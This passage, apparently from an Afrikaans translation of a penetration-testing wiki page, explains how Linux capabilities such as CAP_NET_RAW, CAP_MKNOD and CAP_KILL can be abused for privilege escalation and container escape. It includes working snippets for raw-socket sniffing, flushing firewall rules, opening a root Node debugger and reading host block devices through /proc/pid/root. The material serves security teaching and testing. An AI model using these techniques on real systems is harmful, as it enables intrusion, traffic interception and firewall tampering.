[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) bied ’n aantal sensitiewe bewerkings, waaronder toegang tot `/dev/mem`, `/dev/kmem` of `/proc/kcore`, wysiging van `mmap_min_addr`, toegang tot die `ioperm(2)`- en `iopl(2)`-stelseloproepe, en verskeie skyfopdragte. Die `FIBMAP ioctl(2)` word ook deur hierdie capability geaktiveer, wat in die [verlede](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html) probleme veroorsaak het. Volgens die man-bladsy laat dit die houer ook toe om ’n reeks toestelspesifieke bewerkings op ander toestelle uit te voer.<sup>[[14]](#references)</sup>

Dit kan nuttig wees vir **privilege escalation** en **Docker breakout**.<sup>[[14]](#references)</sup>

Die capability alleen stel nie ’n bruikbare koppelvlak beskikbaar nie. ’n Container breakout vereis ook ’n toeganklike gasheertoestel of -hulpbron, toestelkgroup- en lêerstelseltoestemmings, asook ’n hardeware- en kernspesifieke tegniek. Streng beperkings op `/dev/mem`, kernel lockdown, virtualisering, seccomp en LSM-beleid skakel dikwels die generiese roetes uit. Bevestig eers die capability en blootstelling:

```bash
capsh --print | grep cap_sys_rawio
ls -l /dev/mem /dev/port 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```

As `/dev/mem` die goedgekeurde koppelvlak is, kan ’n weggooibare laboratorium die openbaarmaking van nodegeheue oor grense heen demonstreer deur ’n reeks te lees en die hashwaarde daarvan te bereken; die reeks word uit daardie laboratorium se hardewarekaart gekies:

```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
  skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```

Moenie die reeks raai nie: die lees van sommige MMIO-streke kan newe-effekte hê, en ’n geldige adres op een platform kan hardeware of kerngeheue op ’n ander platform beheer. Wysiging van kerngeheue of beheer van toestelle vereis ’n goedgekeurde, platformspesifieke bewys; daar is geen veilige, universele voorbeeld van ’n rou skryfbewerking nie.

## CAP_KILL

**Hierdie capability omseil toestemmingskontroles vir die stuur van seine na prosesse in die gevalle wat deur die kern gedefinieer word**.<sup>[[14]](#references)</sup>

**Voorbeeld met binary**

Gestel die **`python`**-binary het hierdie capability. As jy ook ’n diens- of socket-konfigurasielêer (of enige konfigurasielêer wat met ’n diens verband hou) kon wysig, kon jy dit ’n backdoor gee, die proses wat met daardie diens verband hou, kill en wag totdat die nuwe konfigurasielêer met jou backdoor uitgevoer word.

```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```

**Privesc met kill**

As jy kill capabilities het en daar 'n **node-program is wat as root loop** (of as 'n ander gebruiker), kan jy waarskynlik vir hom die **sein SIGUSR1 stuur** en hom die **node debugger laat oopmaak**, sodat jy daaraan kan koppel.

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```


{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**Hierdie capability laat toe dat daar aan internetpoorte onder 1024 gebind word.** Dit verleen nie direk groter regte vir privilege escalation nie.<sup>[[14]](#references)</sup>

**Voorbeeld met binary**

As **`python`** hierdie capability het, sal dit op enige poort kan luister en selfs van daar af aan enige ander poort kan koppel (sommige dienste vereis verbindings vanaf poorte met spesifieke regte)

{{#tabs}}
{{#tab name="Listen"}}

```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
        output = connection.recv(1024).strip();
        print(output)
```

{{#endtab}}

{{#tab name="Connect"}}

```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```

{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) laat prosesse toe om **RAW- en PACKET-sockets te skep**, sodat hulle arbitrêre netwerkpakkette kan genereer en stuur. Dit kan tot sekuriteitsrisiko’s in houeromgewings lei, soos pakketvervalsing, verkeersinspuiting en die omseiling van netwerktoegangsbeheer. Kwaadwillige akteurs kan dit uitbuit om houerroetering te ontwrig of die gasheernetwerksekuriteit in gevaar te stel, veral sonder voldoende firewall-beskerming. Daarbenewens ondersteun **CAP_NET_RAW** bewerkings soos ping via RAW ICMP-versoeke.<sup>[[14]](#references)</sup>

**Dit kan pakketvaslegging met ’n geskikte socket-koppelvlak moontlik maak.** Dit verleen nie direk breër voorregte-eskalasie nie.<sup>[[14]](#references)</sup>

Vir ’n pad wat tot blootstelling van geloofsbriewe kan lei, bevestig ook dat die huidige rekening ’n vasleggingsnutsding met effektiewe vermoëns kan uitvoer, dat die betrokke verkeer deur ’n koppelvlak gaan wat in sy netwerknaamruimte sigbaar is, en dat verifikasiemateriaal in gewone teks gestuur word. HTTP Basic-geloofsbriewe oor ongeënkripteerde HTTP kan byvoorbeeld op loopback waargeneem word as die vasleggingsnutsding toegang tot daardie koppelvlak het. ’n Rekeningoorskakeling vereis boonop dat die vasgelegde geloofsbrief vir ’n ander identiteit werk; ’n lêervermoë of ’n sigbare aanmeldversoek alleen bewys nie dat wagwoorde hergebruik word nie.

Op ’n draadlose gasheer is ’n uitvoerbare WPS-ouditnutsding soos `reaver` met effektiewe `CAP_NET_RAW`, plus ’n AP en ’n monitor-modus-koppelvlak wat deur `iw dev` sigbaar is, nog ’n leidraad vir ondersoek. Dit is **nie** bewys van ’n bruikbare eskalasie nie: die AP moet WPS-PIN-verifikasie sonder effektiewe uitsluiting bied, bereikbaar wees vanaf die draadlose koppelvlak en ’n PSK openbaar; gasheervoorregte verander slegs as daardie PSK vir ’n rekening hergebruik word. Passiewe opsomming behoort koppelvlakmodusse en vermoëns aan te meld, nie probes uit te stuur of PIN’s te probeer nie. Sien [CERT/CC VU#723755](https://www.kb.cert.org/vuls/id/723755) vir die WPS-PIN-kwesbaarheid en [Reaver se projekdokumentasie](https://github.com/shift/reaver-wps) vir die nutsding se gedrag.

**Voorbeeld met binary**

As die binary **`tcpdump`** hierdie vermoë het, sal jy dit kan gebruik om netwerkinligting vas te lê.

```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```

As die **omgewing** hierdie vermoë toestaan, kan **`tcpdump`** dit ook gebruik om verkeer af te luister.<sup>[[14]](#references)</sup>

**Voorbeeld met binary 2**

Die volgende voorbeeld is **`python2`**-kode wat nuttig kan wees om verkeer op die "**lo**" (**localhost**)-koppelvlak te onderskep. Die kode kom uit die laboratorium "_Die basiese beginsels: CAP-NET_BIND + NET_RAW_" by [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com).<sup>[[1]](#references)</sup>

```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
    flag=""
    for i in xrange(8,-1,-1):
        if( flag_value & 1 <<i ):
            flag= flag + flags[8-i] + ","
    return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
    frame=s.recv(4096)
    ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
    proto=ip_header[6]
    ip_header_size = (ip_header[0] & 0b1111) * 4
    if(proto==6):
        protocol="TCP"
        tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
        tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
        dst_port=tcp_header[0]
        src_port=tcp_header[1]
        flag=" FLAGS: "+getFlag(tcp_header[4])

    elif(proto==17):
        protocol="UDP"
        udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
        udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
        dst_port=udp_header[0]
        src_port=udp_header[1]

    if (proto == 17 or proto == 6):
        print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
        count=count+1
```

## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) gee die houer die vermoë om **netwerkkonfigurasies te verander**, insluitend firewall-instellings, roetetabelle, socket-toestemmings en netwerkkoppelvlakinstellings in die huidige netwerknaamruimte. Dit kan ook promiscuous mode op ’n koppelvlak in daardie naamruimte aktiveer; dit kan verkeer blootstel wat by daardie koppelvlak afgelewer word, maar dit laat op sigself nie toe dat willekeurige koppelvlakke in ander netwerknaamruimtes afgeluister word nie.<sup>[[14]](#references)</sup>

Hierdie bewerkings raak die proses se **huidige netwerknaamruimte**. Beheer oor die gasheer se netwerktoestand vereis `--network=host`, Kubernetes `hostNetwork: true`, of ’n afsonderlike primitief om ’n naamruimte te betree. `CAP_NET_RAW` alleen is nie ’n generiese gasseldop nie, maar dit het deel gevorm van ’n gedokumenteerde, protokolspesifieke ontsnapping: ’n historiese GCE-ketting het root, die gasheer se netwerknaamruimte, `CAP_NET_ADMIN`, `CAP_NET_RAW`, ongeënkripteerde metadata-verkeer en ’n wedloop-kwesbare versoek aan die guest-agent gekombineer om ’n SSH-sleutel in te voeg. Sien [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html) vir die volledige voorvereistes en moderne HTTPS-metadata-waarskuwings.

**Voorbeeld met binary**

Kom ons veronderstel dat die **python binary** hierdie vermoëns het.

```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```

## CAP_LINUX_IMMUTABLE

**Hierdie vermoë laat toe dat inode-vlae soos immutable en append-only gewysig word.** Dit verleen nie direk breër privilege escalation nie.<sup>[[14]](#references)</sup>

**Voorbeeld met binary**

As jy agterkom dat ’n lêer immutable is en python hierdie vermoë het, kan jy **die immutable-kenmerk verwyder en die lêer wysigbaar maak:**

```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
# Python code to remove the immutable flag and allow modifications
import fcntl
import os
import struct

FS_IMMUTABLE_FL = 0x00000010
FS_IOC_GETFLAGS = 0x80086601
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
flags = struct.unpack('i', fcntl.ioctl(fd, FS_IOC_GETFLAGS, struct.pack('i', 0)))[0]
fcntl.ioctl(fd, FS_IOC_SETFLAGS, struct.pack('i', flags & ~FS_IMMUTABLE_FL))
os.close(fd)

with open('/path/to/file.sh', 'a') as f:
    f.write('New content for the file\n')
```

Die `FS_IOC_GETFLAGS`- en `FS_IOC_SETFLAGS`-bewerkings lees en werk inode-vlae by; `FS_IMMUTABLE_FL` is die onveranderlike vlag wat deur hierdie voorbeeld uitgevee word.<sup>[[27]](#references)</sup>

> [!TIP]
> Let daarop dat hierdie onveranderlike kenmerk gewoonlik gestel en verwyder word met:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) maak die uitvoering van die `chroot(2)`-stelseloproep moontlik, wat ontsnapping uit ’n swak opgestelde `chroot(2)`-jail met bekende tegnieke kan toelaat.<sup>[[11]](#references)[[14]](#references)</sup>

Dit is ’n **chroot-jail-ontsnappingsvermoë, nie ’n selfstandige ontsnapping van ’n container na die host nie**. Dit stel nie die host-lêerstelsel bloot nie en omseil ook nie sy toestemmings nie. As ’n host-root reeds gemonteer of bereikbaar is via `/proc/<pid>/root`, maak `chroot()` daardie bestaande boom bloot die proses se padwortel. Afsonderlik vereis die verandering van mount namespaces met `setns(2)` beide `CAP_SYS_CHROOT` en `CAP_SYS_ADMIN` in die oproeper se user namespace, plus `CAP_SYS_ADMIN` in die user namespace wat die teiken-mount namespace besit.<sup>[[14]](#references)</sup>

- [Hoe om uit verskeie chroot-oplossings te ontsnap](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf).<sup>[[11]](#references)</sup>
- [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) laat die uitvoering van die `reboot(2)`-stelseloproep toe om die stelsel te herbegin, insluitend opdragte soos `LINUX_REBOOT_CMD_RESTART2`; dit maak ook `kexec_load(2)` moontlik en, vanaf Linux 3.17, `kexec_file_load(2)` om onderskeidelik nuwe of ondertekende crash-kernels te laai.<sup>[[14]](#references)</sup>

Binne ’n private PID namespace beëindig ’n ondersteunde `reboot()`-versoek daardie namespace se init-proses in plaas daarvan om die host te herbegin. Impak op ’n host-herbegin vereis dus die aanvanklike PID namespace, gewoonlik deur PID-deling met die host. ’n Kexec-gebaseerde oorname vereis ook ’n versoenbare image, ’n beskikbare syscall en ’n permissiewe lockdown- en handtekeningbeleid. Moenie enige van hierdie bewerkings op ’n gedeelde host uitvoer bloot om die vermoë te bekragtig nie:

```bash
capsh --print | grep cap_sys_boot
readlink /proc/self/ns/pid /proc/1/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) is in Linux 2.6.37 van die breër **CAP_SYS_ADMIN** geskei, spesifiek om die vermoë te verleen om die `syslog(2)`-aanroep te gebruik. Hierdie capability maak dit moontlik om kernel-adresse via `/proc` en soortgelyke koppelvlakke te sien wanneer die `kptr_restrict`-instelling op 1 is, wat bepaal of kernel-adresse blootgestel word. Sedert Linux 2.6.39 is die verstekwaarde vir `kptr_restrict` 0, wat beteken dat kernel-adresse blootgestel word, hoewel baie verspreidings dit om sekuriteitsredes op 1 (verberg adresse behalwe vir uid 0) of 2 (verberg adresse altyd) stel.<sup>[[14]](#references)</sup>

Daarbenewens laat **CAP_SYSLOG** toegang tot `dmesg`-afvoer toe wanneer `dmesg_restrict` op 1 gestel is. Ondanks hierdie veranderinge behou **CAP_SYS_ADMIN** die vermoë om `syslog`-bewerkings uit te voer weens historiese presedente.<sup>[[14]](#references)</sup>

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) brei die funksionaliteit van die `mknod`-stelseloproep uit tot meer as net die skep van gewone lêers, FIFOs (genoemde pype) of UNIX-domeinsokke. Dit laat spesifiek die skep van spesiale lêers toe, waaronder:<sup>[[14]](#references)</sup>

- **S_IFCHR**: Karakter-spesiale lêers, wat toestelle soos terminale is.
- **S_IFBLK**: Blok-spesiale lêers, wat toestelle soos skywe is.

Hierdie capability is nuttig vir prosesse wat toestellêers moet skep, insluitend karakter- of bloktoestelle.<sup>[[14]](#references)</sup>

Dit is ingesluit in Docker se gedokumenteerde verstekstel van capabilities; verifieer die werklike looptydopstelling eerder as om aan te neem dat elke ontplooiing dieselfde verstekwaardes gebruik ([Moby-versteklys van capabilities](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).<sup>[[19]](#references)</sup>

Vir ’n container escape kan `CAP_MKNOD` ’n ontbrekende verwysing na ’n werklike host-toestel skep, maar dit skep **nie** die onderliggende toestel nie en omseil **nie** die device cgroup nie. Die volledige ketting vereis:

1. Effektiewe `CAP_MKNOD` in die aanvanklike user namespace, omdat toestelskepping nie genamespasieer is nie.
2. Die korrekte blok- of karaktertipe en major/minor-nommers vir ’n werklike host-toestel.
3. Toestemming van die device cgroup om daardie toestel oop te maak.
4. ’n Verenigbare leser wat lêerstelsels kan hanteer, of `CAP_SYS_ADMIN` om ’n bloklêerstelsel te mount.
5. Toestemming van die lêerstelsel en LSM om die nodus te skep en te gebruik.

Vir ’n bloktoestel in ’n ext-familie-laboratorium waarvan die werklike major/minor-nommers `252:1` is, is ’n leesalleen-validering:

```bash
mknod /dev/ht-node-root b 252 1
ls -l /dev/ht-node-root
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```

Vervang die getalle met dié wat deur `/sys/class/block/<device>/dev` gerapporteer word. As die skep van die nodus slaag, maar die opening daarvan `Operation not permitted` teruggee, blokkeer die device cgroup steeds toegang. Dit is die normale resultaat in ’n container wat bloot Docker se verstek-`CAP_MKNOD` het, sonder ’n uitdruklike toestemmings vir toestelle.

Daar is ook ’n afsonderlike **two-foothold local privilege-escalation**-tegniek wat nie met direkte toegang tot toestelle in ’n container verwar moet word nie. ’n Root-proses in ’n container wat die aanvanklike user namespace deel, kan ’n block-device-nodus skep. ’n Onbevoorregte shell op die host met ’n ooreenstemmende UID open dan daardie nodus deur `/proc/<container-pid>/root`. Die opening word dan in die cgroup van die host-shell geëvalueer, sodat die container se device-cgroup-weiering nie meer die toestel beskerm nie.<sup>[[7]](#references)</sup>

Skep die nodus binne die container en hou ’n proses aan die gang as die UID van die bestaande host-foothold:

```bash
host_uid=1000 # Replace with the UID of the existing unprivileged host shell.
mknod /dev/ht-node-root b 252 1 # Replace with the real host device numbers.
chown "$host_uid" /dev/ht-node-root
chmod 600 /dev/ht-node-root
bridge_user=$(getent passwd "$host_uid" | cut -d: -f1)
if [ -z "$bridge_user" ]; then
  useradd -u "$host_uid" -M htbridge
  bridge_user=htbridge
fi
su -s /bin/sh "$bridge_user" -c 'sleep 600'
```

Identifiseer vanuit die bestaande host-shell met daardie UID die host-PID van die slapende container-proses en gebruik sy procfs-wortel as die pad na die toestel:

```bash
container_pid=<host-pid-of-the-matching-uid-process>
stat "/proc/${container_pid}/root/dev/ht-node-root"
debugfs -R 'cat /etc/hostname' "/proc/${container_pid}/root/dev/ht-node-root"
```

Hierdie ketting vereis albei toegangspunte, ’n identiteitsgemapte of gedeelde gebruikersnaamruimte, toestemming om deur die teiken se `/proc/<pid>/root` te navigeer, ’n werklike toestel met die korrekte major-/minor-nommers, en ’n buitenste cgroup wat die opening toelaat. `hidepid`, ptrace-toegangsreëls, ’n LSM, lêerstelsel-onversoenbaarheid of gebruikersnaamruimte-herkartering kan dit verydel. Die historiese tegniek is juis waardevol omdat dit verduidelik hoe `/proc/<pid>/root` die *container* se toestel-cgroup-beperking kan omseil; dit beweer nie dat `CAP_MKNOD` alleen uit ’n normaalweg geïsoleerde container ontsnap nie.<sup>[[7]](#references)</sup>

### CAP_SETPCAP

Op huidige Linux-kerne met lêervermoëns laat **`CAP_SETPCAP`** ’n thread toe om vermoëns uit sy bounding set by sy inheritable set te voeg, vermoëns uit sy bounding set te laat vaar en sy securebits te verander. Dit laat ’n proses nie toe om arbitrêr vermoëns aan ’n ander proses toe te ken nie; dié gedrag geld slegs vir kerne voor 2.6.25 wat nie lêervermoëns ondersteun nie.<sup>[[14]](#references)</sup>

Die `capset()`-stelseloproep kan ’n thread se eie effective, permitted en inheritable stelle aanpas, maar die nuwe permitted stel kan nie vermoëns bevat wat buite die bestaande permitted stel val nie, en inheritable-opdaterings bly onderhewig aan kernbeperkings.<sup>[[14]](#references)</sup>

## References

- [1] [AttackDefense (Pentester Academy) - Linux-vermoëns-privilege-escalation-laboratoriums](https://attackdefense.pentesteracademy.com)
- [2] [Hacker's Grimoire - Privilege-escalation in Linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [3] [Linux-containerbasiese beginsels: vermoëns](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [4] [Linux-vermoëns 101](https://linux-audit.com/linux-capabilities-101/)
- [5] [Benutting van Linux-vermoëns](https://www.linuxjournal.com/article/5737)
- [6] [Oormatige vermoëns](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [7] [Misbruik van toegang tot mount-naamruimtes via /proc/pid/root](https://labs.reversec.com/posts/2020/06/abusing-access-to-mount-namespaces-through-procpidroot)
- [8] [Linux-vermoëns: waarom hulle bestaan en hoe hulle werk](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [9] [Begrip van vermoëns in Linux](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
- [10] [PoC om seccomp te omseil as ptrace toegelaat word](https://gist.github.com/thejh/8346f47e359adecd1d53)
- [11] [Hoe om uit verskeie chroot-oplossings te ontsnap](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [12] [shocker.c - oorspronklike CAP_DAC_READ_SEARCH Docker-ontsnappingsuitbuiting deur Sebastian Krahmer](http://stealth.openwall.net/xSports/shocker.c)
- [13] [Ontleding van Docker-ontsnappingsuitbuiting](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)
- [14] [capabilities(7) - Linux-handleidingbladsy](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [15] [proc_pid_status(5) - Linux-handleidingbladsy](https://man7.org/linux/man-pages/man5/proc_pid_status.5.html)
- [16] [pam_cap(8) - Linux-handleidingbladsy](https://man7.org/linux/man-pages/man8/pam_cap.8.html)
- [17] [capability.conf(5) - Ubuntu-handleidingbladsy](https://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)
- [18] [systemd.exec(5) - Linux-handleidingbladsy](https://man7.org/linux/man-pages/man5/systemd.exec.5.html)
- [19] [Containers laat loop - Docker-dokumentasie](https://docs.docker.com/engine/containers/run/)
- [20] [docker container run - Docker-dokumentasie](https://docs.docker.com/reference/cli/docker/container/run)
- [21] [cap_text_formats(7) - Linux-handleidingbladsy](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html)
- [22] [getpcaps(8) - Linux-handleidingbladsy](https://man7.org/linux/man-pages/man8/getpcaps.8.html)
- [23] [getcap(8) - Linux-handleidingbladsy](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [24] [amicontained](https://github.com/genuinetools/amicontained)
- [25] [setcap(8) - Linux-handleidingbladsy](https://man7.org/linux/man-pages/man8/setcap.8.html)
- [26] [capsh(1) - Linux-handleidingbladsy](https://man7.org/linux/man-pages/man1/capsh.1.html)
- [27] [ioctl_iflags(2) - Linux-handleidingbladsy](https://man7.org/linux/man-pages/man2/ioctl_iflags.2.html)
{{#include ../../banners/hacktricks-training.md}}
